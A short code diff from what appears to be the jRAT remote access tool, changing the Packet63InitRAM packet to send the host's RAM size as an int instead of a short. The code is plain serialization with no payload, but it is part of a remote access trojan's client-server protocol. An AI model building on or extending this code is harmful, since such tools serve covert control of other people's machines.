@@ -8,15 +8,15 @@ import pro.jrat.common.io.StringWriter;
 
 public class Packet63InitRAM extends AbstractOutgoingPacket {
 
-	private short mbRam;
+	private int mbRam;
 
-	public Packet63InitRAM(short mbRam) {
+	public Packet63InitRAM(int mbRam) {
 		this.mbRam = mbRam;
 	}
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		dos.writeShort(mbRam);
+		dos.writeInt(mbRam);
 	}
 
 	@Override
